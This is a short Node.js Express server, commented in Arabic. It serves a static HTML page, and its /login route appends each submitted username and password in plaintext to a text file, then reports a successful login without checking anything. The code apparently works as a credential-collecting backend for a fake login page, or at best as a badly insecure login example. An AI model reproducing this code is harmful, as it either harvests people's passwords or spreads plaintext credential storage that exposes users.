const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(express.static('public')); // لخدمة ملفات HTML من مجلد public

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const logData = `اسم المستخدم: ${username}, كلمة المرور: ${password}\n`;

    // كتابة البيانات إلى ملف TXT
    fs.appendFile('login_data.txt', logData, (err) => {
        if (err) {
            console.error('Error writing to file:', err);
            return res.status(500).send('حدث خطأ أثناء تسجيل الدخول.');
        }
        res.send('تم تسجيل الدخول بنجاح!');
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
